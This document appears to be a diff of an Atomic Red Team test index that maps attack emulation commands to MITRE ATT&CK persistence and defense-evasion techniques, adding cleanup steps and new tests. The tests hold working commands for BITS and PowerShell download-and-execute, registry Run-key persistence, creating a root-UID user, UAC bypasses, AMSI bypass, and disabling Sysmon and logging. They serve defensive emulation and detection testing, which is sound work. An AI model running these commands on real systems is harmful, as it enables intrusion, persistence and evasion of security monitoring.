@@ -851,11 +851,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -872,11 +875,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -897,7 +903,7 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -905,7 +911,7 @@ persistence:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -1302,7 +1308,11 @@ persistence:
           default: Evil Account
       executor:
         name: bash
-        command: 'useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}
+        elevation_required: true
+        command: 'useradd -M -N -r -s /bin/bash -c evil_account #{username}
+
+'
+        cleanup_command: 'userdel #{username}
 
 '
     - name: Create a user account on a MacOS system
@@ -1322,6 +1332,7 @@ persistence:
           default: Evil Account
       executor:
         name: bash
+        elevation_required: true
         command: |
           dscl . -create /Users/#{username}
           dscl . -create /Users/#{username} UserShell /bin/bash
@@ -1329,6 +1340,9 @@ persistence:
           dscl . -create /Users/#{username} UniqueID "1010"
           dscl . -create /Users/#{username} PrimaryGroupID 80
           dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
+        cleanup_command: 'dscl . -delete /Users/#{username}
+
+'
     - name: Create a new user in a command prompt
       description: 'Creates a new user in a command prompt
 
@@ -1339,11 +1353,14 @@ persistence:
         username:
           description: Username of the user to create
           type: String
-          default: Evil Account
+          default: T1136_CMD
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'net user /add #{username}
+        command: 'net user /add "#{username}"
+
+'
+        cleanup_command: 'net user /del "#{username}"
 
 '
     - name: Create a new user in PowerShell
@@ -1356,13 +1373,16 @@ persistence:
         username:
           description: Username of the user to create
           type: String
-          default: Evil Account
+          default: T1136_PowerShell
       executor:
         name: powershell
         elevation_required: true
-        command: |
-          New-LocalUser -Name #{username} -NoPassword
-          net user /add #{username}
+        command: 'New-LocalUser -Name "#{username}" -NoPassword
+
+'
+        cleanup_command: 'Remove-LocalUser -Name "#{username}"
+
+'
     - name: Create a new user in Linux with `root` UID and GID.
       description: 'Creates a new user in Linux and adds the user to the `root` group.
         This technique was used by adversaries during the Butter attack campaign.
@@ -1381,9 +1401,13 @@ persistence:
           default: BetterWithButter
       executor:
         name: bash
-        command: |-
+        elevation_required: true
+        command: |
           useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
           echo "#{password}" | passwd --stdin #{username}
+        cleanup_command: 'userdel #{username}
+
+'
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -1495,11 +1519,14 @@ persistence:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -1948,7 +1975,7 @@ persistence:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -2139,16 +2166,20 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -2161,22 +2192,22 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1215:
     technique:
       x_mitre_permissions_required:
@@ -3790,9 +3821,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.exe
       executor:
         name: command_prompt
-        command: |
-          REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
-          REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
+        command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V
+          "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+          /V "Atomic Red Team" /f
+
+'
     - name: Reg Key RunOnce
       description: 'RunOnce Key Persistence
 
@@ -3806,9 +3842,14 @@ persistence:
           default: C:\Path\AtomicRedTeam.dll
       executor:
         name: command_prompt
-        command: |
-          REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
-          REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
+        command: 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+          /v 1 /f
+
+'
     - name: PowerShell Registry RunOnce
       description: 'RunOnce Key Persistence via PowerShell
 
@@ -3825,27 +3866,9 @@ persistence:
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
           set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
-          Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
-    - name: Startup Folder
-      description: 'Add Shortcut To Startup via PowerShell
+        cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 
 '
-      supported_platforms:
-      - windows
-      input_arguments:
-        thing_to_execute:
-          description: Thing to Run
-          type: Path
-          default: C:\Path\AtomicRedTeam.exe
-      executor:
-        name: powershell
-        command: |
-          $TargetFile = "$env:SystemRoot\System32\#{thing_to_execute}"
-          $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
-          $WScriptShell = New-Object -ComObject WScript.Shell
-          $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-          $Shortcut.TargetPath = $TargetFile
-          $Shortcut.Save()
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -3964,8 +3987,11 @@ persistence:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -3997,8 +4023,31 @@ persistence:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
+    - name: Powershell Cmdlet Scheduled Task
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $Action = New-ScheduledTaskAction -Execute "calc.exe"
+          $Trigger = New-ScheduledTaskTrigger -AtLogon
+          $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+          $Set = New-ScheduledTaskSettingsSet
+          $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+          Register-ScheduledTask AtomicTask -InputObject $object
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
 
 '
   T1180:
@@ -4954,6 +5003,9 @@ persistence:
         command: 'xcopy #{web_shells} #{web_shell_path}
 
 '
+        cleanup_command: 'del #{web_shell_path}
+
+'
   T1084:
     technique:
       x_mitre_permissions_required:
@@ -5320,12 +5372,13 @@ defense-evasion:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   '':
     technique:
       x_mitre_data_sources:
@@ -5481,11 +5534,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -5502,11 +5558,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -5527,7 +5586,7 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -5535,7 +5594,7 @@ defense-evasion:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -5733,6 +5792,9 @@ defense-evasion:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -5751,6 +5813,9 @@ defense-evasion:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5770,6 +5835,9 @@ defense-evasion:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5814,7 +5882,33 @@ defense-evasion:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1191:
     technique:
       x_mitre_data_sources:
@@ -5901,7 +5995,7 @@ defense-evasion:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -5919,7 +6013,7 @@ defense-evasion:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -6048,6 +6142,89 @@ defense-evasion:
           unset HISTFILE
           export HISTFILESIZE=0
           history -c
+  T1500:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Process monitoring
+      - File monitoring
+      name: Compile After Delivery
+      description: |
+        Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)
+
+        Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)
+      id: attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925
+      modified: '2019-04-29T21:13:49.686Z'
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_system_requirements:
+      - Compiler software (either native to the system or delivered by the adversary)
+      type: attack-pattern
+      x_mitre_detection: 'Monitor the execution file paths and command-line arguments
+        for common compilers, such as csc.exe and GCC/MinGW, and correlate with other
+        suspicious behavior to reduce false positives from normal user and administrator
+        behavior. The compilation of payloads may also generate file creation and/or
+        file write events. Look for non-native binary formats and cross-platform compiler
+        and execution frameworks like Mono and determine if they have a legitimate
+        purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these
+        should only be used in specific and limited cases, like for software development.'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
+      - Praetorian
+      created: '2019-04-25T20:53:07.719Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1500
+        url: https://attack.mitre.org/techniques/T1500
+      - source_name: ClearSky MuddyWater Nov 2018
+        description: 'ClearSky Cyber Security. (2018, November). MuddyWater Operations
+          in Lebanon and Oman: Using an Israeli compromised domain for a two-stage
+          campaign. Retrieved November 29, 2018.'
+        url: https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf
+      - description: Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads
+          Info Stealer and Adware. Retrieved April 25, 2019.
+        source_name: TrendMicro WindowsAppMac
+        url: https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/
+      x_mitre_defense_bypassed:
+      - Static File Analysis
+      - Binary Analysis
+      - Anti-virus
+      - Host intrusion prevention systems
+      - Signature-based detection
+      identifier: T1500
+    atomic_tests:
+    - name: Compile After Delivery using csc.exe
+      description: "Compile C# code using csc.exe binary used by .NET \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_file:
+          description: C# code that launches calc.exe from a hidden cmd.exe Window
+          type: file
+          default: "$PathToAtomicsFolder\\T1500\\src\\calc.cs"
+        output_file:
+          description: Output compiled binary
+          type: file
+          default: C:\Windows\Temp\T1500.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file}
+          #{input_file}
+
+'
+        cleanup_command: 'del #{output_file}'
   T1223:
     technique:
       x_mitre_data_sources:
@@ -6426,11 +6603,11 @@ defense-evasion:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1207:
@@ -6629,11 +6806,79 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
-          cmd.exe /k %APPDATA%\updater.exe
+          %APPDATA%\updater.exe -Command exit
+        cleanup_command: |
+          del %APPDATA%\updater.exe
+          del %APPDATA%\amsi.dll
+  T1073:
+    technique:
+      x_mitre_data_sources:
+      - Process use of network
+      - Process monitoring
+      - Loaded DLLs
+      name: DLL Side-Loading
+      description: |-
+        Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)
+
+        Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.
+      id: attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Monitor processes for unusual activity (e.g., a process that
+        does not use the network begins to do so). Track DLL metadata, such as a hash,
+        and compare DLLs that are loaded at process execution time against previous
+        executions to detect differences that do not correlate with patching or updates.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      modified: '2019-07-17T19:22:37.443Z'
+      created: '2017-05-31T21:30:58.007Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1073
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1073
+      - source_name: capec
+        external_id: CAPEC-641
+        url: https://capec.mitre.org/data/definitions/641.html
+      - source_name: MSDN Manifests
+        description: Microsoft. (n.d.). Manifests. Retrieved June 3, 2016.
+        url: https://msdn.microsoft.com/en-us/library/aa375365
+      - source_name: Stewart 2014
+        description: 'Stewart, A. (2014). DLL SIDE-LOADING: A Thorn in the Side of
+          the Anti-Virus Industry. Retrieved November 12, 2014.'
+        url: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      - Anti-virus
+      identifier: T1073
+    atomic_tests:
+    - name: DLL Side-Loading using the Notepad++ GUP.exe binary
+      description: 'GUP is an open source signed binary used by Notepad++ for software
+        updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl
+        dll to be loaded
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_name:
+          description: Name of the created process
+          type: string
+          default: calculator.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: "$PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n"
+        cleanup_command: 'taskkill /F /IM #{process_name}'
   T1140:
     technique:
       x_mitre_permissions_required:
@@ -6705,13 +6950,16 @@ defense-evasion:
         executable:
           description: name of executable
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          certutil.exe -encode #{executable} file.txt
-          certutil.exe -decode file.txt #{executable}
+          certutil -encode #{executable} %temp%\T1140_calc.txt
+          certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
+        cleanup_command: |
+          del %temp%\T1140_calc.txt
+          del %temp%T1140_calc_decoded.exe
     - name: Certutil Rename and Decode
       description: 'Rename certutil and decode a file. This is in reference to latest
         research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
@@ -6723,13 +6971,16 @@ defense-evasion:
         executable:
           description: name of executable/file to decode
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp
-          cmd.exe /c %temp%tcm.tmp -decode #{executable} file.txt
+          copy %windir%\system32\certutil.exe %temp%\tcm.tmp
+          %temp%\tcm.tmp -decode #{executable} %temp%\T1140.txt
+        cleanup_command: |
+          del %temp%\tcm.tmp
+          del %temp%\T1140.txt
   T1089:
     technique:
       x_mitre_data_sources:
@@ -6877,8 +7128,10 @@ defense-evasion:
 
 '
     - name: Unload Sysmon Filter Driver
-      description: "Unloads the Sysinternals Sysmon filter driver without stopping
-        the Sysmon service. \n"
+      description: 'Unloads the Sysinternals Sysmon filter driver without stopping
+        the Sysmon service.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -6901,9 +7154,9 @@ defense-evasion:
           fltmc.exe load #{sysmon_driver}
           sc start sysmon
     - name: Disable Windows IIS HTTP Logging
-      description: "Disables HTTP logging on a Windows IIS web server as seen by Threat
-        Group 3390 (Bronze Union). \nThis action requires HTTP logging configurations
-        in IIS to be unlocked.\n"
+      description: |
+        Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
+        This action requires HTTP logging configurations in IIS to be unlocked.
       supported_platforms:
       - windows
       input_arguments:
@@ -6912,9 +7165,17 @@ defense-evasion:
           type: string
           default: Default Web Site
       executor:
-        name: command_prompt
+        name: powershell
+        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {0}
+          else {1}
+
+'
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
           /section:httplogging /dontLog:true
+
+'
+        cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
+          /section:httplogging /dontLog:false
 
 '
     - name: Uninstall Sysmon
@@ -6936,8 +7197,9 @@ defense-evasion:
 
 '
     - name: AMSI Bypass - AMSI InitFailed
-      description: "Any easy way to bypass AMSI inspection is it patch the dll in
-        memory setting the \"amsiInitFailed\" function to true. \nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n"
+      description: |
+        Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+        https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
       supported_platforms:
       - windows
       executor:
@@ -6946,9 +7208,9 @@ defense-evasion:
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
         cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
     - name: AMSI Bypass - Remove AMSI Provider Reg Key
-      description: "With administrative rights, an adversary can remove the AMSI Provider
-        registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis
-        test removes the Windows Defender provider registry key. \n"
+      description: |
+        With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+        This test removes the Windows Defender provider registry key.
       supported_platforms:
       - windows
       executor:
@@ -6963,8 +7225,10 @@ defense-evasion:
 
 '
     - name: Disable Arbitrary Security Windows Service
-      description: "With administrative rights, an adversary can disable Windows Services
-        related to security products. \n"
+      description: 'With administrative rights, an adversary can disable Windows Services
+        related to security products.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -6982,8 +7246,10 @@ defense-evasion:
           sc.exe config #{service_name} start= auto
           net.exe start #{service_name}
     - name: Disable PowerShell Script Block Logging
-      description: "An adversary may disable PowerShell Script Block Logging to avoid
-        leaving evidence. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
@@ -7000,14 +7266,18 @@ defense-evasion:
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
           $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
     - name: PowerShell Bypass of AntiMalware Scripting Interface
-      description: "An adversary may bypass Windows Defender AMSI to execute malicious
-        PowerShell code. \n\nCredit to Matt Graeber (@mattifestation) for the research.\n"
+      description: |
+        An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
+
+        Credit to Matt Graeber (@mattifestation) for the research.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
+        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
+
+'
   T1107:
     technique:
       x_mitre_data_sources:
@@ -7118,17 +7388,12 @@ defense-evasion:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        file_to_delete:
-          description: Path of file to delete
-          type: Path
-          default: C:\Windows\Temp\victim-files-cmd\a
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'del /f #{file_to_delete}
-
-'
+        command: |
+          echo "T1107" > %temp%\T1107.txt
+          del /f  %temp%\T1107.txt
